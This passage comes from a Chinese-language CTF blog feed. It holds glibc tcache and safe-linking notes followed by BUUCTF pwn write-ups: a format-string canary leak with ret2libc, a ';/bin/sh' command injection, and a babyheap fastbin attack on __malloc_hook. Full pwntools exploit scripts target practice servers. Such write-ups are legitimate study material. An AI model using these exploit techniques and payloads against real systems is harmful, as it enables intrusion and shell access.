class="hljs-built_in">free</span>(a);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,a[<span class="hljs-number">0</span>]);<br>&#125; <br></code></pre></td></tr></table></figure><p>而在2.26之后，首先要将<code>tcache</code>填满，（否则会放入<code>tcache</code>中）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">char</span>* argv[])</span><br>&#123;<br>    <span class="hljs-type">long</span>* t[<span class="hljs-number">7</span>];<br>    <span class="hljs-type">long</span> *a=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-type">long</span> *b=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br>    <span class="hljs-comment">// make tcache bin full</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">7</span>;i++)<br>        t[i]=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">7</span>;i++)<br>        <span class="hljs-built_in">free</span>(t[i]);<br><br>    <span class="hljs-built_in">free</span>(a);<br>    <span class="hljs-comment">// a is put in an unsorted bin because the tcache bin of this size is full</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>,a[<span class="hljs-number">0</span>]);<br>&#125; <br></code></pre></td></tr></table></figure><h2 id="一些"><a href="#一些" class="headerlink" title="一些"></a>一些</h2><h3 id="key"><a href="#key" class="headerlink" title="key"></a>key</h3><p>2.27版本加入<code>key</code>成员，其值为<code> tcache_perthread_struct</code>( heap_base+0x10)，位置在bk上</p><p>2.32中加入的<code>safe-linking</code>貌似会结合这个，在<code>key</code>还没变成随机数之前</p><p>2.34以后<code>key</code>成员变成随机数</p><h3 id="next"><a href="#next" class="headerlink" title="next"></a>next</h3><p>2.32加入safe-linking机制，此时不能直接伪造next，要加密后在覆盖</p><p>加密及解密</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PROTECT_PTR(pos, ptr) \</span><br><span class="hljs-meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span><br></code></pre></td></tr></table></figure><ul><li>如何伪造：<ul><li>首先<code>free</code>一个chunk到<code>tcache</code></li><li>由于<code>tcache</code>中只有一个<code>chunk</code>，其<code>fd</code>为0，与<code>pos&gt;&gt;12</code>的值异或后仍然为<code>pos&gt;&gt;12</code>（&gt;&gt;是右移，比如0x12345678&gt;&gt;12&#x3D;0x12345（12为2进制为3位16进制））（<code>pos&gt;&gt;12</code>貌似是堆基地址的高位）</li><li>所以我们利用漏洞泄露出这个<code>pos&gt;&gt;12</code>，在以后的伪造中，将我们要覆盖上去的地址^这个值的结果盖上去即可</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>堆</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>buu做题记录</title>
    <link href="/2025/02/19/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <url>/2025/02/19/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="bjdctf-2020-babyrop2"><a href="#bjdctf-2020-babyrop2" class="headerlink" title="bjdctf-2020-babyrop2"></a>bjdctf-2020-babyrop2</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p><img src="/2025/02/19/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1738725643074.png" alt="checksec"></p><p>可以看到有开canary，可能需要绕过</p><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><p><img src="/2025/02/19/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1738725725804.png" alt="IDA"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">gift</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> format[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I&#x27;ll give u some gift to help u!&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%6s&quot;</span>, format);<br>  <span class="hljs-built_in">printf</span>(format);<br>  <span class="hljs-built_in">puts</span>(byte_400A05);<br>  fflush(<span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28u</span>) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure><p>看到有格式化字符串漏洞，可以利用来泄露canary</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Pull up your sword and tell me u story!&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x64u</span>LL);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28u</span>) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure><p>存在栈溢出</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>首先利用格式化字符串来泄露canary，由于是64位，栈上数据是从%6&amp;p起</p><ul><li>利用gdb查看canary位置</li></ul><p>发现在栈上第二个，也就是%7$p，所以</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=<span class="hljs-string">b&#x27;%7$p&#x27;</span><br>r.recvuntil(<span class="hljs-string">b&#x27;help u!\n&#x27;</span>)<br>r.sendline(payload)<br>r.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>canary=<span class="hljs-built_in">int</span>(r.recv(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<span class="hljs-comment"># 将16进制字符串转换为整数</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;canary:  &quot;</span>,<span class="hljs-built_in">hex</span>(canary))<br></code></pre></td></tr></table></figure><ul><li>接着ret2libc</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x18</span>+p64(canary)+<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x8</span>+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)<br>payload+=p64(vuln_addr)<br>r.recvuntil(<span class="hljs-string">b&#x27;u story!\n&#x27;</span>)<br>r.sendline(payload)<br></code></pre></td></tr></table></figure><p>然后公式计算libc基地址，system，&#x2F;bin&#x2F;sh地址，再进行一次栈溢出即可</p><ul><li>完整脚本：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;AMD64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#r=process(&#x27;./bbrop2&#x27;)</span><br>r=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">29194</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./bbrop2&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23_64.so&#x27;</span>)<br>vuln_addr=<span class="hljs-number">0x400887</span><br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>ret_addr=<span class="hljs-number">0x4005f9</span><br>rdi_addr=<span class="hljs-number">0x400993</span><br><span class="hljs-comment">#gdb.attach(r)</span><br>payload=<span class="hljs-string">b&#x27;%7$p&#x27;</span><br>r.recvuntil(<span class="hljs-string">b&#x27;help u!\n&#x27;</span>)<br>r.sendline(payload)<br>r.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>canary=<span class="hljs-built_in">int</span>(r.recv(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;canary:  &quot;</span>,<span class="hljs-built_in">hex</span>(canary))<br><br>payload=<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x18</span>+p64(canary)+<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x8</span>+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)<br>payload+=p64(vuln_addr)<br>r.recvuntil(<span class="hljs-string">b&#x27;u story!\n&#x27;</span>)<br>r.sendline(payload)<br><br>puts_addr=u64(r.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts_addr=&quot;</span>,<span class="hljs-built_in">hex</span>(puts_addr))<br>libcbase=puts_addr-libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>sys_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr=libcbase+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br><br>r.recvuntil(<span class="hljs-string">b&#x27;u story!\n&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x18</span>+p64(canary)+<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x8</span>+p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(sys_addr)<br>payload+=p64(vuln_addr)<br>r.sendline(payload)<br><span class="hljs-comment">#pause()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h1 id="bjdctf-2020-router"><a href="#bjdctf-2020-router" class="headerlink" title="bjdctf_2020_router"></a>bjdctf_2020_router</h1><h2 id="checksec-1"><a href="#checksec-1" class="headerlink" title="checksec"></a>checksec</h2><p><img src="/2025/02/19/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1739949705480.png" alt="checkec"></p><h2 id="IDA-1"><a href="#IDA-1" class="headerlink" title="IDA"></a>IDA</h2><p><img src="/2025/02/19/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1739949773628.png" alt="IDA"></p><p>在case: 1时就有了system，主要就是利用这个system</p><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>利用case: 1里的函数：</p><ul><li>strcat是将字符串拼接到目标字符串后，dest处本来存在’ping’，<strong>我们要接一个&#x2F;bin&#x2F;sh在后头并且用分号隔开</strong>，这样才会分别执行两个命令，分别是system(“ping”)和system(“&#x2F;bin&#x2F;sh”)</li></ul><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#r=process(&#x27;./br&#x27;)</span><br>r=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">28295</span>)<br>r.recvuntil(<span class="hljs-string">&quot;Please input u choose:\n&quot;</span>)<br>r.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>r.recvuntil(<span class="hljs-string">&quot;Please input the ip address:\n&quot;</span>)<br>payload=<span class="hljs-string">b&#x27;;/bin/sh\x00&#x27;</span><br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h1 id="babyheap-0ctf-2017"><a href="#babyheap-0ctf-2017" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h1><h2 id="checksec-2"><a href="#checksec-2" class="headerlink" title="checksec"></a>checksec</h2><p><img src="/2025/02/19/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1745076693665.png" alt="checksec"></p><h2 id="小贴士"><a href="#小贴士" class="headerlink" title="小贴士"></a>小贴士</h2><p>由于这题是在ubuntu的环境下，我们需要把ld替换成ubuntu16的，也就是2.23版本的ld，这里用glibc-all-in-one</p><ul><li>更改intepreter为glibc-all-in-one中的</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">patchelf</span> --set-interpreter ~/glibc-<span class="hljs-literal">all</span>-in-one/libs/<span class="hljs-number">2</span>.<span class="hljs-number">23</span>-<span class="hljs-number">0</span>ubuntu11.<span class="hljs-number">3</span>_amd64/ld-<span class="hljs-number">2</span>.<span class="hljs-number">23</span>.so babyheap<br></code></pre></td></tr></table></figure><ul><li>更改libc库为题目提供的</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">patchelf</span> --replace-needed libc.so.<span class="hljs-number">6</span> ./libc-<span class="hljs-number">2</span>.<span class="hljs-number">23</span>.so babyheap<br></code></pre></td></tr></table></figure><ul><li>查看是否成功</li></ul><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-keyword">ldd</span> babyheap<br></code></pre></td></tr></table></figure><p>成功的：</p><p><img src="/2025/02/19/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1745157437571.png" alt="ldd"></p><h2 id="IDA-2"><a href="#IDA-2" class="headerlink" title="IDA"></a>IDA</h2><p><img src="/2025/02/19/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1745157511679.png"></p><p>是一个菜单的程序</p><ul><li>菜单</li></ul><p><img src="/2025/02/19/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1745157550405.png"></p><ul><li>allocate</li></ul><p><img src="/2025/02/19/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1745157576347.png"></p><p>可以看到内部是有一个结构体的，有三个成员，分别记录是否已分配，大小，地址</p><ul><li>fill</li></ul><p><img src="/2025/02/19/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1745157639737.png"></p><p>可以看到程序并没有对我们输入的填充长度进行检查，所以漏洞在<strong>堆溢出</strong></p><ul><li>free</li></ul><p><img src="/2025/02/19/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1745158239291.png"></p><p>输入<code>index</code>，然后<code>free</code>掉对应的堆块</p><ul><li>dump</li></ul><p><img src="/2025/02/19/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1745158282191.png"></p><p>输出堆块中的内容</p><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>由于存在堆溢出，我们分两步来get shell</p><p>利用堆溢出泄露unsorted bin链表头-&gt;main_arena-&gt;malloc_hook-&gt;libbase</p><ul><li>申请三个堆块，第一个堆块用于修改第二个堆块的内容，第二个堆块用来泄露链表头地址，第三个堆块用来记录链表头地址</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">alloc(<span class="hljs-number">0x10</span>)<br>alloc(<span class="hljs-number">0x40</span>)<br>alloc(<span class="hljs-number">0x100</span>)<br></code></pre></td></tr></table></figure><ul><li>接着修改第二个堆块大小到第三个堆块的size下面两个区域，这样第二个堆块大小就到了unsortedbin范围内，但此时第三个堆<code>size</code>域被破坏，需要修一下，也就是将第三个堆块的大小放在对应的位置</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">fill(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>))<br>fill(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>))<br></code></pre></td></tr></table></figure><ul><li>此时堆结构<br><img src="/2025/02/19/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/d43a36d7d80fb61101b0f7366642ac38.png"> </li><li>接着<code>free(1)</code>，再<code>allocate(0x60)</code>，将1回来，这一步目的是将1的大小覆盖到2的一部分来泄露链表头地址，但由于这里的allocate执行的是<code>calloc</code>，会将堆数据清零，我们需要在此补充数据0x111来恢复chunk2，接着<code>free(2)</code>，再<code>dump(1)</code>，就能将<code>fd</code>，<code>bk</code>泄露出来，也就是unsortedbin链表头地址，但由于这里的allocate执行的是<code>calloc</code>，会将堆数据清零，我们需要在此补充数据0x111来恢复chunk2，此时需要额外申请一个chunk隔开top chunk</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">free(<span class="hljs-number">1</span>)<br>alloc(<span class="hljs-number">0x60</span>)<br>fill(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x40</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x111</span>))<br>alloc(<span class="hljs-number">0x100</span>) <span class="hljs-comment"># 额外申请的</span><br>free(<span class="hljs-number">2</span>)<br>dump(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>此时堆内容</p><p> <img src="/2025/02/19/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/5e0c813b7cfed6c13ca5bb4e792543dd.png"></p><ul><li>然后就是接收地址和一些地址的计算，gadgets我全写出来了，到时候一个个看看哪个可以</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">unsortedbin_addr=u64(r.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <span class="hljs-comment"># 远程的时候发现是7f开头的，所以这里直接这样了</span><br>mainarena_addr=unsortedbin_addr-<span class="hljs-number">0x58</span><br>malloc_hook=mainarena_addr-<span class="hljs-number">0x10</span><br>libc_base=malloc_hook-libc.symbols[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]<br>free_hook=libc_base+libc.symbols[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;unsorted bin addr=&quot;</span>,<span class="hljs-built_in">hex</span>(unsortedbin_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_base=&quot;</span>,<span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;free_hook=&quot;</span>,<span class="hljs-built_in">hex</span>(free_hook))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;malloc_hook_addr=&quot;</span>,<span class="hljs-built_in">hex</span>(malloc_hook))<br>exceve_addr=[libc_base+<span class="hljs-number">0x45216</span>,libc_base+<span class="hljs-number">0x4526a</span>,libc_base+<span class="hljs-number">0xf02a4</span>,libc_base+<span class="hljs-number">0xf1147</span>]<br></code></pre></td></tr></table></figure><ul><li>最后伪造，将1块free掉，利用0块来修改1块的fd，再分配两次从而分配到<code>malloc_hook-0x23</code>上的堆块，进而修改hook为ogg，然后再分配一次，调用到malloc_hook，就是ogg，从而得到shell</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">free(<span class="hljs-number">1</span>)<br>fill(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(malloc_hook-<span class="hljs-number">0x23</span>))<br>alloc(<span class="hljs-number">0x60</span>)<br>alloc(<span class="hljs-number">0x60</span>)<br><br>fill(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x13</span>+p64(libc_base+<span class="hljs-number">0x4526a</span>))<br><br>alloc(<span class="hljs-number">0x10</span>)<br>r.interactive() <br></code></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;amd64&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>,timeout=<span class="hljs-number">10</span>)<br><span class="hljs-comment">#r=process(&#x27;./babyheap&#x27;)</span><br>r=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">27749</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">alloc</span>(<span class="hljs-params">size</span>):<br>r.recvuntil(<span class="hljs-string">b&quot;Command: &quot;</span>)<br>r.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>r.recvuntil(<span class="hljs-string">b&quot;Size: &quot;</span>)<br>r.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill</span>(<span class="hljs-params">index, content</span>):<br>    r.recvuntil(<span class="hljs-string">b&#x27;Command: &#x27;</span>)<br>    r.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    r.recvuntil(<span class="hljs-string">b&#x27;Index: &#x27;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(index))<br>    r.recvuntil(<span class="hljs-string">b&#x27;Size: &#x27;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>    r.recvuntil(<span class="hljs-string">b&#x27;Content: &#x27;</span>)<br>    r.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>): <br>r.recvuntil(<span class="hljs-string">b&quot;Command: &quot;</span>)<br>r.sendline(<span class="hljs-string">b&quot;3&quot;</span>)<br>r.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>r.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">index</span>):<br>r.recvuntil(<span class="hljs-string">b&quot;Command: &quot;</span>)<br>r.sendline(<span class="hljs-string">b&quot;4&quot;</span>)<br>r.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>r.sendline(<span class="hljs-built_in">str</span>(index))<br><br><br>alloc(<span class="hljs-number">0x10</span>)<br>alloc(<span class="hljs-number">0x40</span>)<br>alloc(<span class="hljs-number">0x100</span>)<br><br>fill(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>))<br>fill(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>))<br>free(<span class="hljs-number">1</span>)<br>alloc(<span class="hljs-number">0x60</span>)<br>fill(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x40</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x111</span>))<br>alloc(<span class="hljs-number">0x100</span>)<br>free(<span class="hljs-number">2</span>)<br>dump(<span class="hljs-number">1</span>)<br>ll=r.recv(<span class="hljs-number">0x50</span>+<span class="hljs-number">10</span>)<br>unsortedbin_addr=u64(r.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span 